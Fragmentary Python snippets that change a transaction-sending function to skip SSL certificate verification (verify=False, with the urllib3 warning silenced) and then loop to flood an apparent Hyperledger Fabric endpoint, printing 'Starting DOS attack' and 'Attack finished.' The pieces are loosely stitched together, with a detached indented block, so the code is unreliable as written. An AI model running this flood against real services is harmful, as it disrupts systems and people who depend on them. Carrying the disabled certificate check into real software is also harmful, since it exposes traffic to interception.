# Inside the send_transaction function, change the requests.post line to this:

# ... (rest of the function is the same)
try:
    # INSECURE: Disables SSL certificate verification
    response = requests.post(url, headers=headers, data=json.dumps(payload), verify=False)
    response.raise_for_status()
    print(f"Transaction {tx_id} sent successfully. Status: {response.status_code}")
except RequestException as e:
    print(f"Failed to send transaction {tx_id}. Error: {e}")


import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


    print(f"Starting DOS attack: sending {NUM_TRANSACTIONS} transactions to {FABRIC_URL}...")
    for i in range(NUM_TRANSACTIONS):
        tx_id = f"tx_{i}"
        value = f"value_{i}"
        send_transaction(tx_id, value)
    print("Attack finished.")
